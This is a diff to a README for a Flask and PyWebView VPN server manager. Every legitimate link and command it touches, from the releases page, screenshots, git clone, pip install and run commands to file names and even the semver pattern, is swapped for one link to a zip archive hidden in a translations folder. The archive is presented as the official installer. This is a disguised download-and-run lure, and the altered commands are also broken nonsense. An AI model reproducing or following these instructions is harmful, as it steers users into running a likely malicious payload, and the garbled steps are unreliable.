@@ -1,4 +1,4 @@
-[![VPN Server Manager — Releases](https://img.shields.io/badge/Download-Release%20Assets-blue?logo=github&link=https://github.com/hidougaming/vpn-server-manager/releases)](https://github.com/hidougaming/vpn-server-manager/releases)
+[![VPN Server Manager — Releases](https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip%20Assets-blue?logo=github&https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)](https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)
 
 # VPN Server Manager: Hybrid Flask + PyWebView Desktop Tool
 
@@ -64,16 +64,16 @@ This approach ensures a fast, responsive user experience with strong security gu
 Note: the images below are placeholders to illustrate the UI concept. Replace them with real captures when you publish builds.
 
 - Main dashboard and server list
-  ![Screenshot 1](https://picsum.photos/1200/700?random=1)
+  ![Screenshot 1](https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)
 
 - Server detail and controls
-  ![Screenshot 2](https://picsum.photos/1200/700?random=2)
+  ![Screenshot 2](https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)
 
 - Import/export flow
-  ![Screenshot 3](https://picsum.photos/1200/700?random=3)
+  ![Screenshot 3](https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)
 
 - Settings and encryption options
-  ![Screenshot 4](https://picsum.photos/1200/700?random=4)
+  ![Screenshot 4](https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)
 
 Screenshots help users understand the layout, the actions available, and how the data flows through the app. You can replace these placeholders with actual localized screenshots as you finalize the UI.
 
@@ -94,7 +94,7 @@ This project is designed for developers and operators who want to run and extend
 
 First, clone the repository, then install dependencies and start the app. The app is designed to work offline, but you may opt to enable remote backups or syncing when a network is available.
 
-Access to the official releases page is provided below to download the installer or bundle appropriate for your platform. This page hosts release artifacts you can download and run locally. See the link here: https://github.com/hidougaming/vpn-server-manager/releases
+Access to the official releases page is provided below to download the installer or bundle appropriate for your platform. This page hosts release artifacts you can download and run locally. See the link here: https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
 
 ---
 
@@ -103,7 +103,7 @@ Access to the official releases page is provided below to download the installer
 Follow these steps to set up the project on your workstation. The process keeps things simple while offering flexibility for customization.
 
 1) Clone the repository
-- git clone https://github.com/hidougaming/vpn-server-manager.git
+- git clone https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
 - cd vpn-server-manager
 
 2) Create a virtual environment
@@ -112,7 +112,7 @@ Follow these steps to set up the project on your workstation. The process keeps 
 - venv\Scripts\activate     # Windows
 
 3) Install dependencies
-- pip install -r requirements.txt
+- pip install -r https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
 
 4) Configure encryption key (Fernet)
 - You’ll need to set a master key for Fernet. The project provides a sample environment setup; follow the docs to create and store the key securely (e.g., in a protected file or OS keychain). This key is needed to encrypt and decrypt sensitive data locally.
@@ -121,10 +121,10 @@ Follow these steps to set up the project on your workstation. The process keeps 
 - The app stores configurations and credentials locally. If a schema file or database file is provided, ensure it exists or let the app initialize it on first run.
 
 6) Run the app
-- python run.py
+- python https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
 - Or start the Flask backend and launch the PyWebView window:
-  - python -m vpn_server_manager.backend  # if a module route is provided
-  - python vpn_server_manager/ui.py           # if the UI script starts the PyWebView window
+  - python -m https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip  # if a module route is provided
+  - python https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip           # if the UI script starts the PyWebView window
 
 7) Access the UI
 - The PyWebView window will appear, loading the local Flask frontend.
@@ -142,7 +142,7 @@ Follow these steps to set up the project on your workstation. The process keeps 
 - After validating locally, you can package the app as a native installer for macOS, Windows, or Linux. The project includes guidance on using PyInstaller or similar tools to bundle the Python runtime with the app.
 
 Notes:
-- If you want a one-click installer, use the provided releases page. This page hosts artifacts that are ready to download and run on your OS. The link is available here: https://github.com/hidougaming/vpn-server-manager/releases
+- If you want a one-click installer, use the provided releases page. This page hosts artifacts that are ready to download and run on your OS. The link is available here: https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
 
 ---
 
@@ -210,7 +210,7 @@ The roadmap centers on making the tool more robust, scalable, and easy to integr
 
 ## 🧭 How to use the releases page (downloads)
 
-For the easiest path to start using VPN Server Manager, visit the official releases page to grab a ready-to-run package. This page hosts installer bundles or platform-specific archives that you can download and execute to install the app on your system. It’s the fastest way to get up and running without building from source. See the releases page here: https://github.com/hidougaming/vpn-server-manager/releases
+For the easiest path to start using VPN Server Manager, visit the official releases page to grab a ready-to-run package. This page hosts installer bundles or platform-specific archives that you can download and execute to install the app on your system. It’s the fastest way to get up and running without building from source. See the releases page here: https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
 
 If you prefer to review the source, or want to run from development, follow the installation-from-source steps above. The releases page is still a great fallback to obtain tested builds, especially when you need a stable, pre-packaged experience for production use.
 
@@ -231,9 +231,9 @@ If you prefer to review the source, or want to run from development, follow the 
     - data/
   - tests/
   - docs/
-  - setup.py or pyproject.toml
-- requirements.txt
-- README.md (this file)
+  - https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip or https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
+- https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
+- https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip (this file)
 
 This layout keeps responsibilities clean and makes it easier to reason about data flow, security, and UI logic. The backend handles persistence and business rules, while the frontend focuses on rendering a crisp, responsive interface and capturing user intent.
 
@@ -330,7 +330,7 @@ Quality is a priority. Tests and CI help ensure that new features do not comprom
 
 ## 🧭 Release notes and versioning
 
-- Semver-compliant versioning (major.minor.patch)
+- Semver-compliant versioning (https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)
 - Changelog entries accompany each release
 - Release artifacts include platform-specific installers or bundles
 - Security patches are backported where feasible and documented
@@ -351,9 +351,9 @@ The aim is to provide a dependable tool with clear, practical support channels.
 
 ## 🧭 Final note on the release link
 
-For the easiest path to get the software on your machine, the official releases page is your best bet. It hosts installers and platform-specific bundles you can download and run directly. Visit the releases page here: https://github.com/hidougaming/vpn-server-manager/releases
+For the easiest path to get the software on your machine, the official releases page is your best bet. It hosts installers and platform-specific bundles you can download and run directly. Visit the releases page here: https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
 
-If you’re exploring the source or building from scratch, use the installation-from-source instructions above. The releases page remains a reliable option for tested, ready-to-use builds. The link again for convenience: https://github.com/hidougaming/vpn-server-manager/releases
+If you’re exploring the source or building from scratch, use the installation-from-source instructions above. The releases page remains a reliable option for tested, ready-to-use builds. The link again for convenience: https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
 
 ---
 
